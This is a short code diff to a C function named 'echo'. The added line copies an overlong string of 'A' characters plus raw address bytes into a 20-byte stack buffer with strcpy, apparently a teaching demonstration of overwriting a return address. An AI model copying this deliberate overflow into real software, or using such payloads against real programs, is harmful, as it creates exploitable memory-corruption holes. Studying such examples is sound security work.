@@ -11,7 +11,7 @@ void echo()
 {
     char buffer[20];
 
-    strcpy(buffer, "");
+    strcpy(buffer, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x10\x05\x00\x00");
     printf("You entered: %s\n", buffer);    
 }
 
